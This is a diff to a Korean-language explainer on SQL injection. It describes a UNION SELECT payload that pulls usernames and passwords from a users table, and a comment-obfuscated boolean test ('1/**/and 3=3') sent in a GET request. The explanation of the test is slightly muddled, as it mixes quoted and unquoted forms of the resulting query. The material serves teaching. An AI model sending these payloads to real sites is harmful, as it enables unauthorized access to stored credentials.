@@ -18,3 +18,23 @@
 * **`username=admin' UNION SELECT null, username, password FROM users --`**: `UNION` 쿼리를 사용해 다른 테이블의 데이터를 추출하려고 시도. 예시에서는 `users` 테이블에서 `username`과 `password`를 가져오려고 함.
 
 ---
+
+```
+1/**/and 3=3
+```
+
+* SQL에서 `/**/`는 **주석**입니다. 즉, `1/**/and`는 `1 and`와 동일하게 처리됩니다.
+* 따라서 최종 쿼리는 실질적으로
+
+```sql
+SELECT * FROM articles WHERE id = '1 and 3=3'
+```
+```
+GET /search.php?s=1/**/and 3=3
+```
+
+👉 이 경우 `3=3`은 항상 참이므로, 최종 쿼리는 `WHERE id = 1 and TRUE`,
+결과적으로 ID가 1인 데이터가 조회됩니다.
+
+---
+
